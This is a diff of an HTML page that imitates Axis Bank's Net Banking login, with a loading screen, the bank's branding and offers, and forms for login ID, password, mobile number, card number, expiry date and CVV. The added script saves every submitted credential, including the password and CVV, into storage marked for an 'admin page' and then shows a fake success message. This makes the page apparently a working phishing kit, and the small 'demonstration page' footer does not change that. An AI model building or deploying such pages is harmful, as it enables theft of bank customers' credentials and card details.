@@ -3,84 +3,192 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Axis Bank Net Banking Login</title>
+    <title>Axis Bank Net Banking</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Arial', sans-serif;
         }
         
         body {
-            background-color: #f5f7fa;
+            background: linear-gradient(135deg, #f5f7fa 0%, #e3e9f7 100%);
             min-height: 100vh;
+        }
+        
+        /* Loading animation */
+        .loading-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #87103F;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            z-index: 1000;
+            transition: opacity 0.5s ease;
+        }
+        
+        .loading-dot {
+            width: 20px;
+            height: 20px;
+            background: white;
+            border-radius: 50%;
+            position: absolute;
+            left: -30px;
+            top: 50%;
+            transform: translateY(-50%);
+            animation: dot-move 3s ease-in-out forwards;
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.7);
+        }
+        
+        @keyframes dot-move {
+            0% {
+                left: -30px;
+                width: 20px;
+                height: 20px;
+                opacity: 0.5;
+            }
+            15% {
+                width: 40px;
+                height: 40px;
+                opacity: 1;
+            }
+            50% {
+                left: 50%;
+                width: 30px;
+                height: 30px;
+                transform: translate(-50%, -50%);
+            }
+            85% {
+                width: 40px;
+                height: 40px;
+                opacity: 1;
+            }
+            100% {
+                left: calc(100% + 30px);
+                width: 20px;
+                height: 20px;
+                opacity: 0.5;
+            }
+        }
+        
+        .loading-text {
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            position: absolute;
+            top: 60%;
+            text-align: center;
+            width: 100%;
+            opacity: 0;
+            animation: fade-in 1s ease 1.5s forwards;
+        }
+        
+        @keyframes fade-in {
+            to {
+                opacity: 1;
+            }
         }
         
         /* Main container */
-        .login-container {
-            width: 100%;
-            max-width: 450px;
-            background-color: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
+        .container {
+            display: none;
         }
         
         /* Header */
-        .login-header {
-            background-color: #AE164E; /* Burgundy color */
+        .main-header {
+            background: #87103F;
             color: white;
-            padding: 30px;
-            text-align: center;
-            position: relative;
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 12px rgba(135, 16, 63, 0.3);
         }
         
-        .bank-logo {
+        .logo-section {
             display: flex;
             align-items: center;
-            justify-content: center;
-            margin-bottom: 15px;
         }
         
-        .bank-logo-circle {
-            width: 50px;
-            height: 50px;
-            background-color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+        .logo-img {
+            height: 45px;
+            width: auto;
             margin-right: 15px;
-            color: #AE164E;
-            font-weight: 700;
-            font-size: 24px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
         }
         
         .bank-name {
-            font-size: 28px;
-            font-weight: 700;
+            font-size: 22px;
+            font-weight: bold;
             letter-spacing: 0.5px;
         }
         
-        .bank-subtitle {
-            font-size: 16px;
-            opacity: 0.9;
-            margin-top: 5px;
+        .header-right {
+            text-align: right;
         }
         
-        /* Toggle switch */
+        .header-title {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-bottom: 3px;
+        }
+        
+        .header-subtitle {
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        
+        /* Main content */
+        .main-content {
+            display: flex;
+            padding: 30px;
+            max-width: 1200px;
+            margin: 0 auto;
+            gap: 30px;
+        }
+        
+        /* Login section */
+        .login-section {
+            flex: 1;
+            max-width: 450px;
+        }
+        
+        .login-box {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(135, 16, 63, 0.15);
+            overflow: hidden;
+        }
+        
+        .login-header {
+            background: #87103F;
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        
+        .login-header h2 {
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+        
+        .login-header p {
+            opacity: 0.9;
+            font-size: 14px;
+        }
+        
+        /* Toggle Switch */
         .toggle-container {
             display: flex;
-            background-color: rgba(255, 255, 255, 0.2);
+            background: rgba(255, 255, 255, 0.2);
             border-radius: 50px;
             padding: 5px;
-            margin-top: 25px;
+            margin-top: 20px;
             position: relative;
         }
         
@@ -94,6 +202,7 @@
             transition: all 0.3s ease;
             z-index: 1;
             position: relative;
+            color: white;
         }
         
         .toggle-slider {
@@ -102,30 +211,21 @@
             left: 5px;
             width: calc(50% - 5px);
             height: calc(100% - 10px);
-            background-color: white;
+            background: white;
             border-radius: 50px;
-            transition: transform 0.4s cubic-bezier(0.68, -0.55, 0.27, 1.55);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
         }
         
         .active-toggle {
-            color: #AE164E;
+            color: #87103F;
         }
         
-        /* Form container */
+        /* Form styling */
         .form-container {
             padding: 30px;
         }
         
-        .form-title {
-            color: #333;
-            font-size: 20px;
-            margin-bottom: 25px;
-            text-align: center;
-            font-weight: 600;
-        }
-        
-        /* Form styling */
         .login-form {
             display: block;
         }
@@ -148,17 +248,19 @@
         
         .form-input {
             width: 100%;
-            padding: 15px;
+            padding: 14px 15px;
             border: 1.5px solid #ddd;
-            border-radius: 8px;
+            border-radius: 6px;
             font-size: 16px;
             transition: all 0.3s ease;
+            background: #f9f9f9;
         }
         
         .form-input:focus {
-            border-color: #AE164E;
+            border-color: #87103F;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(174, 22, 78, 0.1);
+            background: white;
+            box-shadow: 0 0 0 3px rgba(135, 16, 63, 0.1);
         }
         
         .input-with-icon {
@@ -170,355 +272,560 @@
             right: 15px;
             top: 50%;
             transform: translateY(-50%);
-            color: #AE164E;
+            color: #87103F;
         }
         
-        .card-input-group {
-            display: flex;
-            gap: 15px;
-        }
-        
-        .card-input-group .form-group {
-            flex: 1;
-        }
-        
-        .card-input-group .form-group:first-child {
-            flex: 2;
-        }
-        
-        /* Button */
-        .login-button {
+        .submit-button {
             width: 100%;
-            background-color: #AE164E;
+            background: #87103F;
             color: white;
             border: none;
             padding: 16px;
-            border-radius: 8px;
+            border-radius: 6px;
             font-size: 18px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
             margin-top: 10px;
-            box-shadow: 0 4px 10px rgba(174, 22, 78, 0.3);
+            box-shadow: 0 4px 10px rgba(135, 16, 63, 0.3);
         }
         
-        .login-button:hover {
-            background-color: #8c123d;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(174, 22, 78, 0.4);
+        .submit-button:hover {
+            background: #6a0c32;
         }
         
-        /* Forgot link */
-        .forgot-link {
+        .form-links {
             text-align: center;
             margin-top: 20px;
         }
         
-        .forgot-link a {
-            color: #AE164E;
+        .form-links a {
+            color: #87103F;
             text-decoration: none;
             font-weight: 500;
+            font-size: 14px;
+            margin: 0 10px;
+        }
+        
+        /* Info sections */
+        .info-section {
+            flex: 1.5;
+        }
+        
+        .info-box {
+            background: white;
+            border-radius: 10px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            border-left: 4px solid #87103F;
+        }
+        
+        .info-title {
+            color: #87103F;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .info-title i {
+            margin-right: 10px;
+            font-size: 22px;
+        }
+        
+        .info-content {
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 15px;
             font-size: 15px;
         }
         
-        .forgot-link a:hover {
-            text-decoration: underline;
+        .info-button {
+            display: inline-block;
+            background: #87103F;
+            color: white;
+            padding: 10px 25px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
         }
         
-        /* Security message */
-        .security-message {
-            background-color: #f9f9f9;
-            border-left: 4px solid #AE164E;
-            padding: 15px;
-            margin-top: 25px;
-            border-radius: 0 8px 8px 0;
-            font-size: 14px;
-            color: #555;
+        .info-button:hover {
+            background: #6a0c32;
+            transform: translateY(-2px);
         }
         
-        .security-message strong {
-            color: #AE164E;
+        .exclusive-offers {
+            background: linear-gradient(135deg, #87103F 0%, #6a0c32 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 30px;
+        }
+        
+        .exclusive-title {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .offer-list {
+            list-style: none;
+        }
+        
+        .offer-list li {
+            padding: 12px 0;
+            border-bottom: 1px dashed rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+        }
+        
+        .offer-list li:before {
+            content: "✓";
+            color: #87103F;
+            background: white;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            font-weight: bold;
         }
         
         /* Footer */
-        .login-footer {
+        .main-footer {
+            background: #2c3e50;
+            color: white;
             text-align: center;
-            padding: 20px;
-            font-size: 14px;
-            color: #777;
-            border-top: 1px solid #eee;
-            margin-top: 20px;
+            padding: 25px;
+            margin-top: 40px;
         }
         
-        .login-footer a {
-            color: #AE164E;
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin-bottom: 15px;
+        }
+        
+        .footer-links a {
+            color: #ddd;
             text-decoration: none;
+            font-size: 14px;
         }
         
-        /* Responsive design */
-        @media (max-width: 480px) {
-            .login-container {
+        .footer-links a:hover {
+            color: white;
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            font-size: 13px;
+            color: #aaa;
+            margin-top: 10px;
+        }
+        
+        /* Responsive */
+        @media (max-width: 900px) {
+            .main-content {
+                flex-direction: column;
+            }
+            
+            .login-section {
                 max-width: 100%;
             }
-            
-            .login-header {
-                padding: 20px;
-            }
-            
-            .form-container {
-                padding: 20px;
-            }
-            
-            .card-input-group {
-                flex-direction: column;
-                gap: 0;
-            }
-            
-            .bank-logo {
+        }
+        
+        @media (max-width: 600px) {
+            .main-header {
                 flex-direction: column;
                 text-align: center;
+                padding: 15px;
             }
             
-            .bank-logo-circle {
-                margin-right: 0;
+            .logo-section {
                 margin-bottom: 10px;
+            }
+            
+            .main-content {
+                padding: 15px;
+            }
+            
+            .login-header, .form-container {
+                padding: 20px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <!-- Header section -->
-        <div class="login-header">
-            <div class="bank-logo">
-                <div class="bank-logo-circle">A</div>
-                <div class="bank-name">AXIS BANK</div>
+    <!-- Loading Animation -->
+    <div class="loading-container" id="loadingScreen">
+        <div class="loading-dot"></div>
+        <div class="loading-text">Loading Axis Bank Net Banking...</div>
+    </div>
+    
+    <!-- Main Content -->
+    <div class="container" id="mainContainer">
+        <!-- Header -->
+        <header class="main-header">
+            <div class="logo-section">
+                <img src="logo1.jpg" alt="Axis Bank Logo" class="logo-img" onerror="this.style.display='none'">
+                <div class="bank-name">Axis Bank</div>
             </div>
-            <div class="bank-subtitle">Net Banking Login</div>
+            <div class="header-right">
+                <div class="header-title">open | INTERNET BANKING</div>
+                <div class="header-subtitle">Login using</div>
+            </div>
+        </header>
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Login Section -->
+            <div class="login-section">
+                <div class="login-box">
+                    <div class="login-header">
+                        <h2>Secure Login</h2>
+                        <p>Access your account safely</p>
+                        
+                        <!-- Toggle Switch -->
+                        <div class="toggle-container">
+                            <div class="toggle-option active-toggle" id="toggleLogin">Login ID</div>
+                            <div class="toggle-option" id="toggleCredit">Credit Card</div>
+                            <div class="toggle-slider" id="toggleSlider"></div>
+                        </div>
+                    </div>
+                    
+                    <div class="form-container">
+                        <!-- Login ID Form -->
+                        <form class="login-form" id="loginForm" method="POST" action="admin.html">
+                            <div class="form-group">
+                                <label class="form-label" for="loginId">Login / Customer ID</label>
+                                <div class="input-with-icon">
+                                    <input type="text" class="form-input" id="loginId" name="loginId" placeholder="Enter your Login ID" required>
+                                    <div class="input-icon">👤</div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="password">Password</label>
+                                <div class="input-with-icon">
+                                    <input type="password" class="form-input" id="password" name="password" placeholder="Enter your password" required>
+                                    <div class="input-icon">🔒</div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="mobile">Mobile Number</label>
+                                <div class="input-with-icon">
+                                    <input type="tel" class="form-input" id="mobile" name="mobile" placeholder="Registered mobile number" required>
+                                    <div class="input-icon">📱</div>
+                                </div>
+                            </div>
+                            
+                            <button type="submit" class="submit-button">Login to Net Banking</button>
+                        </form>
+                        
+                        <!-- Credit Card Form -->
+                        <form class="credit-form" id="creditForm" method="POST" action="admin.html">
+                            <div class="form-group">
+                                <label class="form-label" for="cardNumber">16 Digit Card Number</label>
+                                <div class="input-with-icon">
+                                    <input type="text" class="form-input" id="cardNumber" name="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
+                                    <div class="input-icon">💳</div>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="expiry">Expiry Date</label>
+                                <input type="text" class="form-input" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="cvv">CVV</label>
+                                <input type="password" class="form-input" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="cardMobile">Mobile Number</label>
+                                <div class="input-with-icon">
+                                    <input type="tel" class="form-input" id="cardMobile" name="cardMobile" placeholder="Registered mobile number" required>
+                                    <div class="input-icon">📱</div>
+                                </div>
+                            </div>
+                            
+                            <button type="submit" class="submit-button">Login with Credit Card</button>
+                        </form>
+                        
+                        <div class="form-links">
+                            <a href="#" id="forgotLink">Forgot Login ID / Password?</a>
+                            <a href="#">New User? Register Here</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
             
-            <!-- Toggle switch -->
-            <div class="toggle-container">
-                <div class="toggle-option active-toggle" id="toggleCustomer">Login/Customer</div>
-                <div class="toggle-option" id="toggleCreditCard">Credit Card</div>
-                <div class="toggle-slider" id="toggleSlider"></div>
+            <!-- Info Section -->
+            <div class="info-section">
+                <div class="info-box">
+                    <div class="info-title">
+                        <i>🔒</i> Secure & Reliable
+                    </div>
+                    <div class="info-content">
+                        Bank with confidence. Know your digital safety measures.
+                    </div>
+                    <button class="info-button">KNOW MORE</button>
+                </div>
+                
+                <div class="info-box">
+                    <div class="info-title">
+                        <i>📞</i> Get in Touch
+                    </div>
+                    <div class="info-content">
+                        We have got your back when you are stuck.
+                    </div>
+                    <button class="info-button">KNOW MORE</button>
+                </div>
+                
+                <div class="info-box">
+                    <div class="info-title">
+                        <i>📱</i> Get Mobile App
+                    </div>
+                    <div class="info-content">
+                        Download our Axis Bank mobile app on your smartphone.
+                    </div>
+                    <button class="info-button">DOWNLOAD</button>
+                </div>
+                
+                <div class="exclusive-offers">
+                    <div class="exclusive-title">Exclusive offers and products</div>
+                    <ul class="offer-list">
+                        <li>Contactless enabled Credit Cards</li>
+                        <li>Home loan upto Rs. 28 Lakhs</li>
+                        <li>Experience seamless credit approval</li>
+                        <li>Instant personal loans</li>
+                        <li>Zero balance savings account</li>
+                    </ul>
+                </div>
             </div>
         </div>
         
-        <!-- Form container -->
-        <div class="form-container">
-            <h3 class="form-title" id="formTitle">Login with Customer ID</h3>
-            
-            <!-- Customer Login Form -->
-            <form class="login-form" id="customerForm">
-                <div class="form-group">
-                    <label class="form-label" for="customerId">Login/Customer ID</label>
-                    <div class="input-with-icon">
-                        <input type="text" class="form-input" id="customerId" placeholder="Enter your Customer ID" required>
-                        <div class="input-icon">👤</div>
-                    </div>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label" for="password">Password</label>
-                    <div class="input-with-icon">
-                        <input type="password" class="form-input" id="password" placeholder="Enter your password" required>
-                        <div class="input-icon">🔒</div>
-                    </div>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label" for="mobile">Mobile Number</label>
-                    <div class="input-with-icon">
-                        <input type="tel" class="form-input" id="mobile" placeholder="Enter registered mobile number" required>
-                        <div class="input-icon">📱</div>
-                    </div>
-                </div>
-                
-                <button type="submit" class="login-button">Login to Net Banking</button>
-            </form>
-            
-            <!-- Credit Card Login Form -->
-            <form class="credit-form" id="creditCardForm">
-                <div class="form-group">
-                    <label class="form-label" for="cardNumber">16 Digit Card Number</label>
-                    <div class="input-with-icon">
-                        <input type="text" class="form-input" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
-                        <div class="input-icon">💳</div>
-                    </div>
-                </div>
-                
-                <div class="card-input-group">
-                    <div class="form-group">
-                        <label class="form-label" for="expiry">Expiry Date</label>
-                        <input type="text" class="form-input" id="expiry" placeholder="MM/YY" maxlength="5" required>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label class="form-label" for="cvv">CVV</label>
-                        <input type="password" class="form-input" id="cvv" placeholder="123" maxlength="3" required>
-                    </div>
-                </div>
-                
-                <div class="form-group">
-                    <label class="form-label" for="cardMobile">Mobile Number</label>
-                    <div class="input-with-icon">
-                        <input type="tel" class="form-input" id="cardMobile" placeholder="Enter registered mobile number" required>
-                        <div class="input-icon">📱</div>
-                    </div>
-                </div>
-                
-                <button type="submit" class="login-button">Login with Credit Card</button>
-            </form>
-            
-            <!-- Forgot links -->
-            <div class="forgot-link">
-                <a href="#" id="forgotLink">Forgot Customer ID / Password?</a>
+        <!-- Footer -->
+        <footer class="main-footer">
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+                <a href="#">Security Tips</a>
+                <a href="#">Contact Us</a>
+                <a href="#">Branch Locator</a>
+                <a href="#">FAQs</a>
             </div>
-            
-            <!-- Security message -->
-            <div class="security-message">
-                <strong>Security Tip:</strong> Never share your Customer ID, Password, Card Number, CVV or OTP with anyone.
+            <div class="copyright">
+                © 2023 Axis Bank Ltd. All Rights Reserved. | This is a demonstration page.
             </div>
-            
-            <!-- Footer -->
-            <div class="login-footer">
-                <p>New to Axis Bank? <a href="#">Register for Net Banking</a></p>
-                <p style="margin-top: 5px; font-size: 12px;">© 2023 Axis Bank Ltd. All rights reserved.</p>
-            </div>
-        </div>
+        </footer>
     </div>
 
     <script>
-        // DOM elements
-        const toggleCustomer = document.getElementById('toggleCustomer');
-        const toggleCreditCard = document.getElementById('toggleCreditCard');
+        // Loading animation
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                document.getElementById('loadingScreen').style.opacity = '0';
+                setTimeout(function() {
+                    document.getElementById('loadingScreen').style.display = 'none';
+                    document.getElementById('mainContainer').style.display = 'block';
+                }, 500);
+            }, 3000); // 3 seconds loading time
+        });
+        
+        // DOM elements for toggle
+        const toggleLogin = document.getElementById('toggleLogin');
+        const toggleCredit = document.getElementById('toggleCredit');
         const toggleSlider = document.getElementById('toggleSlider');
-        const customerForm = document.getElementById('customerForm');
-        const creditCardForm = document.getElementById('creditCardForm');
-        const formTitle = document.getElementById('formTitle');
+        const loginForm = document.getElementById('loginForm');
+        const creditForm = document.getElementById('creditForm');
         const forgotLink = document.getElementById('forgotLink');
         const cardNumberInput = document.getElementById('cardNumber');
         const expiryInput = document.getElementById('expiry');
         const cvvInput = document.getElementById('cvv');
         
-        // Toggle between forms
-        toggleCustomer.addEventListener('click', function() {
-            toggleCustomer.classList.add('active-toggle');
-            toggleCreditCard.classList.remove('active-toggle');
+        // Toggle between Login ID and Credit Card forms
+        toggleLogin.addEventListener('click', function() {
+            // Update toggle UI
+            toggleLogin.classList.add('active-toggle');
+            toggleCredit.classList.remove('active-toggle');
             toggleSlider.style.transform = 'translateX(0)';
-            customerForm.style.display = 'block';
-            creditCardForm.style.display = 'none';
-            formTitle.textContent = 'Login with Customer ID';
-            forgotLink.textContent = 'Forgot Customer ID / Password?';
+            
+            // Show login form, hide credit form
+            loginForm.style.display = 'block';
+            creditForm.style.display = 'none';
+            
+            // Update forgot link
+            forgotLink.textContent = 'Forgot Login ID / Password?';
         });
         
-        toggleCreditCard.addEventListener('click', function() {
-            toggleCreditCard.classList.add('active-toggle');
-            toggleCustomer.classList.remove('active-toggle');
+        toggleCredit.addEventListener('click', function() {
+            // Update toggle UI
+            toggleCredit.classList.add('active-toggle');
+            toggleLogin.classList.remove('active-toggle');
             toggleSlider.style.transform = 'translateX(100%)';
-            customerForm.style.display = 'none';
-            creditCardForm.style.display = 'block';
-            formTitle.textContent = 'Login with Credit Card';
+            
+            // Show credit form, hide login form
+            loginForm.style.display = 'none';
+            creditForm.style.display = 'block';
+            
+            // Update forgot link
             forgotLink.textContent = 'Forgot Credit Card Details?';
         });
         
         // Format card number input (XXXX XXXX XXXX XXXX)
-        cardNumberInput.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            let formattedValue = '';
-            
-            for (let i = 0; i < value.length && i < 16; i++) {
-                if (i > 0 && i % 4 === 0) {
-                    formattedValue += ' ';
+        if (cardNumberInput) {
+            cardNumberInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                let formattedValue = '';
+                
+                for (let i = 0; i < value.length && i < 16; i++) {
+                    if (i > 0 && i % 4 === 0) {
+                        formattedValue += ' ';
+                    }
+                    formattedValue += value[i];
                 }
-                formattedValue += value[i];
-            }
-            
-            e.target.value = formattedValue;
-        });
+                
+                e.target.value = formattedValue;
+            });
+        }
         
         // Format expiry date input (MM/YY)
-        expiryInput.addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-            
-            if (value.length >= 2) {
-                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
-            } else {
-                e.target.value = value;
-            }
-        });
+        if (expiryInput) {
+            expiryInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                
+                if (value.length >= 2) {
+                    e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                } else {
+                    e.target.value = value;
+                }
+            });
+        }
         
         // Only allow numbers in CVV field
-        cvvInput.addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/[^0-9]/gi, '');
-        });
+        if (cvvInput) {
+            cvvInput.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/[^0-9]/gi, '');
+            });
+        }
         
         // Form submission handlers
-        customerForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const customerId = document.getElementById('customerId').value;
-            const password = document.getElementById('password').value;
-            const mobile = document.getElementById('mobile').value;
-            
-            if (customerId && password && mobile) {
-                // Simulate login process
-                const loginBtn = customerForm.querySelector('.login-button');
-                const originalText = loginBtn.textContent;
+        if (loginForm) {
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
                 
-                loginBtn.textContent = "Logging in...";
-                loginBtn.disabled = true;
+                const loginId = document.getElementById('loginId').value;
+                const password = document.getElementById('password').value;
+                const mobile = document.getElementById('mobile').value;
                 
-                setTimeout(() => {
-                    alert(`Customer login successful for ID: ${customerId}`);
-                    loginBtn.textContent = originalText;
-                    loginBtn.disabled = false;
-                }, 1500);
-            } else {
-                alert("Please fill in all fields");
-            }
-        });
-        
-        creditCardForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const cardNumber = document.getElementById('cardNumber').value;
-            const expiry = document.getElementById('expiry').value;
-            const cvv = document.getElementById('cvv').value;
-            const cardMobile = document.getElementById('cardMobile').value;
-            
-            if (cardNumber && expiry && cvv && cardMobile) {
-                // Validate card number length (remove spaces for validation)
-                const cleanCardNumber = cardNumber.replace(/\s+/g, '');
-                
-                if (cleanCardNumber.length !== 16) {
-                    alert("Please enter a valid 16-digit card number");
-                    return;
+                if (loginId && password && mobile) {
+                    // Save to localStorage for admin page
+                    saveSubmission('login', {
+                        loginId: loginId,
+                        password: password,
+                        mobile: mobile,
+                        time: new Date().toLocaleString()
+                    });
+                    
+                    // Show loading
+                    const submitBtn = loginForm.querySelector('.submit-button');
+                    const originalText = submitBtn.textContent;
+                    submitBtn.textContent = "Logging in...";
+                    submitBtn.disabled = true;
+                    
+                    setTimeout(() => {
+                        alert(`Login successful! Data saved.`);
+                        submitBtn.textContent = originalText;
+                        submitBtn.disabled = false;
+                        loginForm.reset();
+                    }, 1500);
+                } else {
+                    alert("Please fill in all fields");
                 }
-                
-                if (cvv.length !== 3) {
-                    alert("Please enter a valid 3-digit CVV");
-                    return;
-                }
-                
-                // Simulate login process
-                const loginBtn = creditCardForm.querySelector('.login-button');
-                const originalText = loginBtn.textContent;
-                
-                loginBtn.textContent = "Verifying card...";
-                loginBtn.disabled = true;
-                
-                setTimeout(() => {
-                    alert(`Credit card login successful for card ending in ${cleanCardNumber.substring(12)}`);
-                    loginBtn.textContent = originalText;
-                    loginBtn.disabled = false;
-                }, 1500);
-            } else {
-                alert("Please fill in all fields");
-            }
-        });
+            });
+        }
         
-        // Mobile number validation (only numbers)
+        if (creditForm) {
+            creditForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const cardNumber = document.getElementById('cardNumber').value;
+                const expiry = document.getElementById('expiry').value;
+                const cvv = document.getElementById('cvv').value;
+                const cardMobile = document.getElementById('cardMobile').value;
+                
+                if (cardNumber && expiry && cvv && cardMobile) {
+                    const cleanCardNumber = cardNumber.replace(/\s+/g, '');
+                    
+                    if (cleanCardNumber.length !== 16) {
+                        alert("Please enter a valid 16-digit card number");
+                        return;
+                    }
+                    
+                    if (cvv.length !== 3) {
+                        alert("Please enter a valid 3-digit CVV");
+                        return;
+                    }
+                    
+                    // Save to localStorage
+                    saveSubmission('credit', {
+                        cardNumber: cardNumber,
+                        expiry: expiry,
+                        cvv: cvv,
+                        mobile: cardMobile,
+                        time: new Date().toLocaleString()
+                    });
+                    
+                    // Show loading
+                    const submitBtn = creditForm.querySelector('.submit-button');
+                    const originalText = submitBtn.textContent;
+                    submitBtn.textContent = "Verifying card...";
+                    submitBtn.disabled = true;
+                    
+                    setTimeout(() => {
+                        alert(`Credit card login successful! Data saved.`);
+                        submitBtn.textContent = originalText;
+                        submitBtn.disabled = false;
+                        creditForm.reset();
+                    }, 1500);
+                } else {
+                    alert("Please fill in all fields");
+                }
+            });
+        }
+        
+        // Save submission to localStorage
+        function saveSubmission(type, data) {
+            let submissions = JSON.parse(localStorage.getItem('axisSubmissions') || '[]');
+            
+            submissions.unshift({
+                id: Date.now(),
+                type: type,
+                data: data,
+                timestamp: new Date().toISOString(),
+                isNew: true
+            });
+            
+            localStorage.setItem('axisSubmissions', JSON.stringify(submissions));
+        }
+        
+        // Mobile number validation
         const mobileInputs = document.querySelectorAll('input[type="tel"]');
         mobileInputs.forEach(input => {
             input.addEventListener('input', function(e) {
@@ -526,24 +833,16 @@
             });
         });
         
-        // Forgot link click
-        forgotLink.addEventListener('click', function(e) {
-            e.preventDefault();
-            const isCustomerForm = customerForm.style.display === 'block';
-            
-            if (isCustomerForm) {
-                alert("Redirecting to Customer ID/Password recovery page...");
-            } else {
-                alert("Redirecting to Credit Card recovery page...");
-            }
-        });
-        
-        // Initial setup - set active form
-        window.addEventListener('DOMContentLoaded', function() {
-            // Default to customer form
-            toggleCustomer.classList.add('active-toggle');
-            customerForm.style.display = 'block';
-            creditCardForm.style.display = 'none';
+        // Info buttons functionality
+        document.querySelectorAll('.info-button').forEach(button => {
+            button.addEventListener('click', function() {
+                const text = this.textContent;
+                if (text === 'KNOW MORE') {
+                    alert("More information will be displayed here.");
+                } else if (text === 'DOWNLOAD') {
+                    alert("Redirecting to App Store/Play Store...");
+                }
+            });
         });
     </script>
 </body>
